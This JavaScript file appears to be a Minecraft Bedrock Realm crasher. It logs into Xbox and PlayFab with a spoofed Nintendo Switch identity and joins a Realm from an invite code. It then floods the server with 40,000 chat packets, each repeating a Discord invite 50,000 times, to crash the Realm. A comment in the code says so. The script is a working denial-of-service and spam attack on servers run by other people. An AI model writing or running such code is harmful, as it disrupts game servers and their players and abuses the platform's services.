const bedrock = require('bedrock-protocol');
const { Authflow: PrismarineAuth, Titles } = require('prismarine-auth')


async function real(invite) {
    const authflow = new PrismarineAuth(undefined, "./data", { 
        flow: "live", 
        authTitle: Titles.MinecraftNintendoSwitch, 
        deviceType: "Nintendo", 
        doSisuAuth: true 
    });
    try{
        await authflow.getXboxToken("rp://playfabapi.com/")
        .then(({ userHash, XSTSToken }) => {
    
    

    
            fetch("https://20ca2.playfabapi.com/Client/LoginWithXbox?sdk=XPlatCppSdk-3.6.190304", {
                method: "POST",
                headers: new Headers({
                    "Cache-Control": "no-cache",
                    "Accept": "application/json",
                    "Accept-Language": "en-CA,en;q=0.5",
                    "User-Agent": "ibhttpclient/1.0.0.0",
                    "content-type": "application/json; charset=utf-8",
                    "x-playfabsdk": "XPlatCppSdk-3.6.190304",
                    "x-reporterrorassuccess": "true",
                    "Connection": "Keep-Alive",
                    "Host": "20ca2.playfabapi.com"
                }),
                body: JSON.stringify({
                    CreateAccount: true,
                    EncryptedRequest: null,
                    InfoRequestParameters: {
                        GetCharacterInventories: false,
                        GetCharacterList: false,
                        GetPlayerProfile: true,
                        GetPlayerStatistics: false,
                        GetTitleData: false,
                        GetUserAccountInfo: true,
                        GetUserData: false,
                        GetUserInventory: false,
                        GetUserReadOnlyData: false,
                        GetUserVirtualCurrency: false,
                        PlayerStatisticNames: null,
                        ProfileConstraints: null,
                        TitleDataKeys: null,
                        UserDataKeys: null,
                        UserReadOnlyDataKeys: null,
                    },
                    PlayerSecret: null,
                    TitleId: "20CA2",
                    XboxToken: `XBL3.0 x=${userHash};${XSTSToken}`
                }),
                redirect: "follow",
            })
            .then(response => response.json())
            .then(baseentity => {
                if (baseentity.error) {
                    return console.log(baseentity.errorMessage);
                }
    
    
                console.log(baseentity.data.PlayFabId)

    
                fetch("https://20ca2.playfabapi.com/Authentication/GetEntityToken?sdk=XPlatCppSdk-3.6.190304", {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "x-entitytoken": baseentity.data.EntityToken.EntityToken,
                        "Accept-Language": "en-CA,en;q=0.5",
                        "Accept-Encoding": "gzip, deflate, br",
                        Host: "20ca2.playfabapi.com",
                        Connection: "Keep-Alive",
                        "Cache-Control": "no-cache",
                    },
                    body: JSON.stringify({
                        Entity: JSON.stringify({
                            Id: baseentity.data.PlayFabId,
                            Type: "master_player_account",
                        }),
                    }),
                })
                .then(response => response.json())
                .then(async basetoken => {
                    const info = {
                        baseentity
                    };
                    baseentity = info
                    console.log(`[info] authed to playfab`);
                    console.log(`[info] playfab id >> ${info.baseentity.data.PlayFabId}`);
    
                    const client = bedrock.createClient({
                        profilesFolder: "./data",
                        realms: {
                            realmInvite: invite
                        },
                        skinData: {
                            PersonaPieces: [], // ssbp
                        },
                        conLog: console.log,
                        skipPing: true
                    })

    client.on("disconnect", (packet) => {
        console.log(packet)
    })

    client.on('play_status', async () => {
        try {
            setTimeout(() => {
                for (let i = 0; i < 40000; i++) {
                    client.write('text', {
                        filtered_message: '',
                        type: 'chat',
                        needs_translation: false,
                        source_name: client.profile.name,
                        message: `discord.gg/stressv2\n`.repeat(50000), // crash realm can remove this (old method)
                        xuid: '0',
                        platform_chat_id: '0',
                    });
                }
            }, 2000);

            setTimeout(() => {
                    client.disconnect();
                
            }, 10000);
        } catch (error) {
            console.error(error);
            throw error;
        }
    });
    let i = 0
    client.on("player_list", (packet) => {
        if(packet.records.type === 'add') {
            for (packet of packet.records.records) {
                if(i !== 1) return i++
                console.log(`${packet.username} joined`)
            }
        } else {
            console.log(`${packet.records.records[0].username} left`)
        }
    })

    
    client.on('start_game', (packet) => { 
        console.log(`${client.username} joined`)
      });

                })
                .catch(error => console.error(`[err] ${error}`));
            })
            .catch(error => console.error(`[err] ${error}`));
        })
        .catch(error => console.error(`[err] ${error}`));
} catch (error) {
    if(error.message.includes("No valid subscription")) return console.log("No valid subscription")
    else console.log(error.message)
}
}




real('Realm code goes here')
